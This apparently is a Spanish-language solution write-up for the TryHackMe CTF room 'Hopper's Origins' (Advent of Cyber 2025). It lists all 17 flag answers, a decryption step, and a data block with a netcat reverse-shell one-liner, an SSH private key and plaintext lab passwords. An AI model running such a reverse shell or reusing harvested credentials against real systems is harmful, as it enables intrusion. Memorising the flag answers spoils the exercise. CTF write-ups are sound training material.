# Hopper's Origins

| **Dificultad** | INSANE | **Tipo** | CTF (Free Room) | **Slug** | ho-aoc2025-yboMoPbnEX | | **Link** | [TryHackMe](https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX) | | **Invitacion / Invite** | [https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX](https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX) | | **Seccion** | Advent of Cyber Tryhackme / Advent 2025 Side Quest 0 | | **Fuente** | texto oficial THM + walkthrough propio (sala creada por m03bam4n) | | **Componentes** | crypto / pbpkdf2 / CTF / horizon / invitational | | **Impacto** | Acceso por invitacion (link /jr/); sin el la sala no se abre. La llave final de Sidequest 1 desbloquea el acceso via CORS leak |

---

**Contexto:** Origen de Hopper. De HopSec Island, Eggsploits susurran a traves de TBFC - Origenes de como SOC-mas se convirtio en EAST-mas. Es un room **por invitacion** (link /jr/), sin el la sala no se abre; el link normal /room/ muestra 'privada'. Se conservan ambos links (Room /room/ + Invite /jr/). El room requiere desbloquear la llave con el Invite Code de Sidequest 1.

**Invite Code:** THM{There.is.no.EASTmas.without.Hopper}`r

**Access URL (Hopper's Invitation):** https://static-labs.tryhackme.cloud/apps/hoppers-invitation/`r

Al ingresar la llave del final de Sidequest 1, se observa un error de CORS, pero se revela el archivo adicional:

**Archivo adicional:** https://assets.tryhackme.com/additional/aoc2025/files/hopper-origins.txt`r

**Content (ciphertext):**

`	ext
hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI
`

### Ejecucion del POC (Prueba de Concepto) / POC Execution

`python
[*] Intentando hackear el acceso...
[*] Datos extraidos:
    - Salt: 865440ab0df31719eb814c35199bac93
    - IV:   ec218501c4d05fa0ed88d68e
    - Tag:  826fa594520a80f37a18d7b045f5c10e
    - Longitud Ciphertext: 46 bytes
[*] Derivando clave con PBKDF2...
--------------------------------------------------
RESULTADO:
https://tryhackme.com/jr/ho-aoc2025-yboMoPbnEX
--------------------------------------------------
`

**Room Link:** [https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX](https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX)

---

## Solucionario

### Task 1: Flag Submissions - DB (user.txt)

**Explicacion:** En Linux las flags estan en /user.txt (user.txt) y /root/root.txt (root.txt). En Windows: C:\user.txt y C:\Users\Administrator\root.txt. Los flags de DB.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 1 | DB: user.txt | THM{114136cc-e9ab-4303-a825-18cb24d60d90} |

### Task 2: AI.VANCHAT.LOC (user.txt)

**Explicacion:** Primera flag del host AI.VANCHAT.LOC.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 2 | AI.VANCHAT.LOC: user.txt | THM{1dac8c6b-908e-4100-9deb-f53e68df840d} |

### Task 3: AI.VANCHAT.LOC (root.txt)

**Explicacion:** Flag root del host AI.VANCHAT.LOC, tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 3 | AI.VANCHAT.LOC: root.txt | THM{c4baffdf-7a8d-44e0-8405-3cb6a2bb91cc} |

### Task 4: TBFC.LOC (user.txt)

**Explicacion:** Flag user del host TBFC.LOC.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 4 | TBFC.LOC: user.txt | THM{f3336b39-5601-40ea-a4d9-8b87cb4535a6} |

### Task 5: TBFC.LOC (root.txt)

**Explicacion:** Flag root del host TBFC.LOC tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 5 | TBFC.LOC: root.txt | THM{449d70b5-a212-45ca-a49b-037678f49569} |

### Task 6: VANCHAT.LOC (user.txt)

**Explicacion:** Flag user del host VANCHAT.LOC.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 6 | VANCHAT.LOC: user.txt | THM{e36efac9-555b-424a-b44d-8bfd9bc5f660} |

### Task 7: VANCHAT.LOC (root.txt)

**Explicacion:** Flag root del host VANCHAT.LOC tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 7 | VANCHAT.LOC: root.txt | THM{cf66a7ad-6b5f-4e48-be3a-a39881f537c1} |

### Task 8: SERVER1 (user.txt)

**Explicacion:** Flag user del host SERVER1.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 8 | SERVER1: user.txt | THM{20f7d7ac-5768-4883-a33f-09e4a738bff1} |

### Task 9: SERVER1 (root.txt)

**Explicacion:** Flag root del host SERVER1 tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 9 | SERVER1: root.txt | THM{d93ffd47-5629-4590-8eb3-743404547e04} |

### Task 10: SERVER2 (user.txt)

**Explicacion:** Flag user del host SERVER2.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 10 | SERVER2: user.txt | THM{d626aea9-d1ab-4f77-b668-90f221e3dbb6} |

### Task 11: SERVER2 (root.txt)

**Explicacion:** Flag root del host SERVER2 tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 11 | SERVER2: root.txt | THM{496fde67-1d0d-4776-833d-b6371f290eac} |

### Task 12: SERVER3 (user.txt)

**Explicacion:** Flag user del host SERVER3.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 12 | SERVER3: user.txt | THM{a89e2667-f920-4c10-99ec-3ed33a7cf1b9} |

### Task 13: SERVER3 (root.txt)

**Explicacion:** Flag root del host SERVER3 tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 13 | SERVER3: root.txt | THM{4fc264ab-8449-4039-a22d-25ee7d15626e} |

### Task 14: SERVER4 (user.txt)

**Explicacion:** Flag user del host SERVER4.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 14 | SERVER4: user.txt | THM{b792725b-604a-416d-9cbb-fe70d4def322} |

### Task 15: SERVER4 (root.txt)

**Explicacion:** Flag root del host SERVER4 tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 15 | SERVER4: root.txt | THM{c58b7654-321a-4872-9645-d28097dcc9da} |

### Task 16: Web (user.txt)

**Explicacion:** Flag user del host Web.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 16 | Web: user.txt | THM{82f9d06e-9a52-44d5-98c2-aef647805216} |

### Task 17: Web (root.txt)

**Explicacion:** Flag root del host Web tras escalada de privilegios.

| # | Pregunta | Respuesta |
| --- | --- | --- |
| 17 | Web: root.txt | THM{583d5e19-4e61-47f1-b98e-5ece3b2d41db} |

---

**Datos adicionales recopilados / Additional data (credentiales, payloads, tools):**

`	ext
SOC_ADMIN_EXECUTE_COMMAND: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 4444 >/tmp/f

id_ed25519
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAELOYujt
/vluUdyS/U7ZndAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGT9FlPyzrv+aUra
DIDA8Q5nTOhHZ0IpHfpbQDIs/ph/AAAAoDMzy/jLhDwOxhUUP+1NiVFSG7XAdtc8fNeTPI
XN6WKNqQD94nB1iOqzmN7g55slKuxmANcieQGkKYUibOiI16Hp+pOakUq16Vuj0PFZdKLe
gMNn4lfTDF6EsNQOMP1oF7L8MJcpySn1qCWm1ocso0CHDgsD3Xj0dOTXaTYxehnupB0vJR
FLHQ6nBC63Zb8VP9GxtfiSewAd+OkRPe8B/3c=
-----END OPENSSH PRIVATE KEY-----

ssh -v -i id_rsa socbot3000@IP
password (for soc bot)
CVE for sudo CVE-2025-32463

anne.clark@ai.vanchat.loc  Wbqs8193

qw2.amy.young@AI.VANCHAT.LOC password1!
AI\qw1.brian.singh:_4v41yVd$!DW
qw1.lucy.fry Password123!
qw1.martyn.jones Password123!
password in keepass adm_8XX8N5VBFprFfmFSdQ4soUM4

rdp server 3 to 4
TBFC-SQLServer1\AGI P@ssword123!

`
**Historia / Story:**

`	ext
Hopper couldn't shake the memory of how he, only he, made the King's dream a reality. And after all of that, how did the King repay him? Humiliation. Incarceration. Hopper had always been overjoyed to lead the Red Team Battalion - too overjoyed, some thought. Multiple anonymous sources reported Hopper for showing 'delusions of grandeur' and early signs of going 'mad with power.' Surely the King would defend him? After everything Hopper had done? What the King did was the furthest thing from that. King Malhare stripped Hopper of his title and 'crowned' him the new Court Jester. With no choice but to obey, Hopper was forced to entertain the royal court day after day, month after month - until one day he failed to contain his anger and snapped back at the King. He was immediately sent to the HopSec Asylum, where he now sits. But as rumours spread that King Malhare finally intends to launch Operation EAST-mas, Hopper's rage ignites anew. He must find a way out. The story continues in this year's Advent of Cyber & SideQuest event!
`
---
**Metodologia:**
1. Egg decode de Sidequest 1 para obtener el Invite Code THM{There.is.no.EASTmas.without.Hopper}`r
2. Acceso via CORS leak al archivo hopper-origins.txt`r
3. Decrypt con PBKDF2 (Salt 865440ab0df31719eb814c35199bac93, IV c218501c4d05fa0ed88d68e, Tag 826fa594520a80f37a18d7b045f5c10e, longitud ciphertext 46 bytes) para obtener el link /jr/`r
4. Compromiso de los hosts: DB, AI.VANCHAT.LOC, TBFC.LOC, VANCHAT.LOC, SERVER1-4, Web
5. Lectura de user.txt y root.txt en cada host
6. Total 17 flags
**Learning chain:** Sidequest 1 -> Invite Code -> CORS leak -> hopper-origins.txt -> PBKDF2 decrypt -> /jr/ invite -> DB -> AI.VANCHAT.LOC -> TBFC.LOC -> VANCHAT.LOC -> SERVER1-4 -> Web -> 17 flags
**Leccion:** *El CORS misconfiguration en aplicaciones web puede filtrar informacion sensible; la criptografia con PBKDF2 bien implementada es la unica barrera entre los datos cifrados y el compromiso total.*
**MITRE ATT&CK:**
- T1190 - Exploit Public-Facing Application
- T1027 - Obfuscated Files or Information
- T1078 - Valid Accounts
- T1068 - Exploitation for Privilege Escalation
- T1555 - Credentials from Password Stores
**Fuente:** [TryHackMe - Hopper's Origins](https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX)
